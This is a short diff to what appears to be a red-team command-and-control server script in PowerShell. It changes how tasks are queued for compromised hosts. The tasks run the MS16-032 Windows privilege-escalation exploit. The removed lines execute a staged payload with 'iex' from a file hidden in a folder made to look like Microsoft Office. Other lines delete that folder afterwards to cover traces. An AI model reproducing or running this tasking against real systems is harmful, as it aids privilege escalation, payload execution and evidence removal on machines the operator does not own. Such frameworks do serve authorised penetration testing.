@@ -795,8 +795,6 @@ $error.clear()
             }
             if ($pscommand -eq 'invoke-ms16-032')
             { 
-                CheckModuleLoaded "Invoke-MS16-032.ps1" $psrandomuri
-
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
@@ -813,14 +811,12 @@ $error.clear()
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
-                    Command   = "invoke-ms16-032 'powershell.exe iex (get-content c:\programdata\msofficepro98\registry.dat)'"
+                    Command   = "LoadModule invoke-ms16-032.ps1"
                 } | Out-Null
                 $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
             }
             if ($pscommand -eq 'invoke-ms16-032-proxypayload')
             { 
-                CheckModuleLoaded "Invoke-MS16-032.ps1" $psrandomuri
-
                 if (Test-Path "$FolderPath\proxypayload.bat"){ 
                 $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"               
                 CheckModuleLoaded "Invoke-MS16-032.ps1" $psrandomuri
@@ -840,8 +836,9 @@ $error.clear()
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
-                    Command   = "invoke-ms16-032 'powershell.exe iex (get-content c:\programdata\msofficepro98\registry.dat)'"
+                    Command   =  "LoadModule invoke-ms16-032.ps1"
                 } | Out-Null
+
                 $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
